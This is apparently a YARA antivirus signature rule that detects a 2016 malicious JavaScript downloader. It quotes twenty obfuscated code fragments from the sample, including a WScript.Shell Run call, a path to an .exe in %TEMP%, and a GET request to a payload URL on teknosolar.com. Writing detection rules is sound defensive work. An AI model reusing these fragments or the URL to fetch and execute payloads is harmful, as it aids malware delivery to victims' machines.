rule sig_20160328_604657379900f22298667d99ce66ee2d {
  meta:
    description = "datamaliciousorder - file 20160328_604657379900f22298667d99ce66ee2d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "78a86c9382d1810127ec7c856ba57f3e03f08f162c77ae9eaadc3969d15d2479"

  strings:
    $s1  = "function Souenvtea() {return Jpvdjkuv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"y7sCv1Mub5jx5.exe\";};" fullword ascii
    $s2  = "Jxifg[Lzqxbxwkg](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Tktnogaef](Ggochtq() * 11)} while (Jxifg[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Jpvdjkuv = function Qbqgzj() {return WScript[Khjfuzomli](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tdpswzgeub(Zpdnj, Xggzbqc){return Zpdnj - Xggzbqc;};" fullword ascii
    $s6  = "function Owggsydje() {return ((Ddgbrti == true) && (Ddgbrti == Dqujx)) ? 1 : Xkwcee;};" fullword ascii
    $s7  = "function Vsxzoch(Vxzfg){Jpvdjkuv[\"Run\"](Vxzfg, Xkwcee, Xkwcee);};" fullword ascii
    $s8  = " while (Qdhsixw){" fullword ascii
    $s9  = "var Gepzh = false;" fullword ascii
    $s10 = "function Rbgwruqzzd(){return Ksumx;};" fullword ascii
    $s11 = "Dqujx = true; " fullword ascii
    $s12 = "Ddgbrti = true; " fullword ascii
    $s13 = "function Vgnxrwqhmv()" fullword ascii
    $s14 = "var Ddgbrti = false;" fullword ascii
    $s15 = "var Cdnyi = new this[\"Date\"]();" fullword ascii
    $s16 = "function Qjcvtgiul(Sxytc) {var Tenlsheriz = (1, 2, 3, 4, 5, Sxytc); return Tenlsheriz;};" fullword ascii
    $s17 = "function Ggochtq(){return 22;};" fullword ascii
    $s18 = "var Dqujx = false;" fullword ascii
    $s19 = "function Rjbglcrmo(){return Khjfuzomli;};" fullword ascii
    $s20 = "return Tdpswzgeub(Qlrneucavx, Aulzfnezih);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}